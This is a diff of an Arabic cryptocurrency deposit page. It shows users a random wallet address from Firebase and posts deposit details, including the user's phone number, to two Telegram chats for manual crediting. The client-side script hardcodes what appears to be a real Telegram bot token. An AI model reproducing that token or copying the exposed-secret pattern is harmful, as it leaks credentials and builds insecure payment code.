@@ -14,77 +14,106 @@
         <h2 class="logo">إيداع <span>الرصيد</span></h2>
         <p class="subtitle">اختر الشبكة المناسبة لإتمام عملية الإيداع</p>
 
-        <select id="networkSelect" class="network-select" onchange="showWallet()">
-            <option value="">-- اختر الشبكة --</option>
-            <option value="TRC20">TRON (TRC20)</option>
-            <option value="ERC20">Ethereum (ERC20)</option>
-            <option value="BEP20">BNB Smart Chain (BEP20)</option>
-            <option value="SOL">Solana (SOL)</option>
-            <option value="POLYGON">Polygon (MATIC)</option>
-        </select>
-
-        <div id="walletBox" class="wallet-box" style="display:none;">
-            <p class="wallet-label">عنوان المحفظة الخاص بك:</p>
-            <div class="address-display">
-                <span id="walletAddress">جاري توليد العنوان...</span>
-                <button onclick="copyAddress()" class="copy-btn">نسخ</button>
-            </div>
-            <p class="warning-text">⚠️ تأكد من إرسال العملة الصحيحة للشبكة المختارة.</p>
+        <div class="input-group">
+            <select id="networkSelect" class="network-select" onchange="showWallet()">
+                <option value="">-- اختر الشبكة --</option>
+                <option value="TRC20">TRON (TRC20)</option>
+                <option value="ERC20">Ethereum (ERC20)</option>
+                <option value="BEP20">BNB Smart Chain (BEP20)</option>
+                <option value="SOL">Solana (SOL)</option>
+                <option value="POLYGON">Polygon (MATIC)</option>
+            </select>
         </div>
 
-        <hr class="divider">
+        <div id="walletBox" class="wallet-box" style="display:none; background: rgba(0,0,0,0.03); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
+            <p style="font-size: 12px; color: #7f8c8d; margin-bottom: 8px;">عنوان المحفظة المخصص لك:</p>
+            <div style="display: flex; align-items: center; gap: 10px; background: #fff; padding: 10px; border-radius: 8px; border: 1px dashed #bdc3c7;">
+                <span id="walletAddress" style="font-size: 13px; word-break: break-all; color: #2c3e50; font-weight: bold;">جاري التوليد...</span>
+                <button onclick="copyAddress()" style="background: #2c3e50; color: #fff; border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 12px;">نسخ</button>
+            </div>
+            <p style="font-size: 11px; color: #e74c3c; margin-top: 8px;">⚠️ تنبيه: أرسل العملة الصحيحة فقط لهذه الشبكة لتجنب ضياع الرصيد.</p>
+        </div>
+
+        <hr style="border: 0; border-top: 1px solid rgba(0,0,0,0.05); margin: 20px 0;">
 
         <form id="confirmDeposit">
-            <input type="number" id="amount" placeholder="المبلغ المودع ($)" required>
-            <button type="submit" class="btn-primary">تأكيد وإرسال الإشعار</button>
+            <div class="input-group">
+                <input type="number" id="amount" placeholder="المبلغ المودع بالدولار ($)" required min="10">
+            </div>
+            <button type="submit" class="btn-primary">تأكيد العملية وإرسال الإشعار</button>
         </form>
 
         <p class="version-text" onclick="triggerVault()">v1.0.8</p>
     </div>
 
     <script>
+        // إعدادات البوت والـ IDs اللي بعتهم يا يوسف
         const botToken = "8619795327:AAF8hZQVZlyLkxYyU6bmuu2KVM2nyNUmpRE";
         const chatIds = ["8622780736", "8211953992"];
+        const userPhone = localStorage.getItem('userPhone') || "Unknown";
 
-        // مصفوفة المحافظ (مبدئياً، وهنربطها بلوحة التحكم لاحقاً)
-        const wallets = {
-            "TRC20": ["Txxxxxxxxxxxxxxxx1", "Txxxxxxxxxxxxxxxx2", "Txxxxxxxxxxxxxxxx3"], // هنا هيتحط الـ 10 عناوين
-            "ERC20": ["0xxxxxxxxxxxxxxxxx1", "0xxxxxxxxxxxxxxxxx2"],
-            "BEP20": ["0bxxxxxxxxxxxxxxxx1"],
-            "SOL": ["Sxxxxxxxxxxxxxxxxx1"],
-            "POLYGON": ["0pxxxxxxxxxxxxxxxx1"]
-        };
-
-        function showWallet() {
+        // وظيفة سحب المحافظ عشوائياً من الـ 50 محفظة في الفايربيز
+        async function showWallet() {
             const net = document.getElementById('networkSelect').value;
+            const addrSpan = document.getElementById('walletAddress');
+            const box = document.getElementById('walletBox');
+
             if(net) {
-                const randomWallet = wallets[net][Math.floor(Math.random() * wallets[net].length)];
-                document.getElementById('walletAddress').innerText = randomWallet;
-                document.getElementById('walletBox').style.display = 'block';
+                addrSpan.innerText = "جاري اختيار محفظة آمنة...";
+                box.style.display = 'block';
+
+                try {
+                    // سحب قائمة المحافظ للشبكة المختارة من الـ Firebase
+                    const snapshot = await firebase.database().ref('wallets/' + net).once('value');
+                    const wallets = snapshot.val();
+
+                    if(wallets && wallets.length > 0) {
+                        // اختيار محفظة واحدة عشوائياً من الـ 10 الموجودين
+                        const randomAddr = wallets[Math.floor(Math.random() * wallets.length)];
+                        addrSpan.innerText = randomAddr;
+                    } else {
+                        addrSpan.innerText = "لا توجد محافظ متوفرة حالياً، اتصل بالدعم.";
+                    }
+                } catch (error) {
+                    addrSpan.innerText = "خطأ في الاتصال بالقاعدة.";
+                }
             }
         }
 
+        // وظيفة النسخ
         function copyAddress() {
-            const addr = document.getElementById('walletAddress').innerText;
-            navigator.clipboard.writeText(addr);
-            alert("تم نسخ العنوان بنجاح!");
+            const text = document.getElementById('walletAddress').innerText;
+            navigator.clipboard.writeText(text).then(() => alert("تم نسخ المحفظة!"));
         }
 
+        // إرسال الطلب النهائي للتليجرام
         document.getElementById('confirmDeposit').onsubmit = async (e) => {
             e.preventDefault();
             const amount = document.getElementById('amount').value;
             const net = document.getElementById('networkSelect').value;
             const addr = document.getElementById('walletAddress').innerText;
-            const depositID = "AMT-" + Math.floor(1000 + Math.random() * 9000); // كود فريد
+            
+            // توليد كود إيداع فريد للمستخدم (AMT-XXXX)
+            const depositID = "AMT-" + Math.floor(1000 + Math.random() * 9000);
 
-            const message = `💰 طلب إيداع جديد!\n💵 المبلغ: $${amount}\n🌐 الشبكة: ${net}\n📍 المحفظة: ${addr}\n🆔 كود الإيداع: ${depositID}`;
+            if(!net) return alert("يرجى اختيار الشبكة أولاً");
 
+            const message = `💰 **طلب إيداع جديد**\n\n👤 المستخدم: ${userPhone}\n💵 المبلغ: $${amount}\n🌐 الشبكة: ${net}\n📍 المحفظة: ${addr}\n🆔 كود التأكيد: ${depositID}\n\nيرجى مراجعة التحويل يدوياً قبل إضافة الرصيد.`;
+
+            // إرسال الإشعار لـ يوسف وللشريك
             chatIds.forEach(id => {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`);
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
             });
 
-            alert(`تم إرسال الطلب! كود الإيداع الخاص بك هو: ${depositID}\nسيتم مراجعة الطلب وإضافة الرصيد يدوياً.`);
+            alert(`تم إرسال الطلب!\nكود الإيداع الخاص بك هو: ${depositID}\nقم بإرسال هذا الكود للدعم عبر تليجرام لتفعيل الرصيد.`);
+            window.location.href = "dashboard.html";
         };
     </script>
+
+    <style>
+        .wider { max-width: 500px; }
+        .network-select { cursor: pointer; background: #fff; font-weight: 600; }
+        .copy-btn:active { transform: scale(0.95); }
+    </style>
 </body>
 </html>
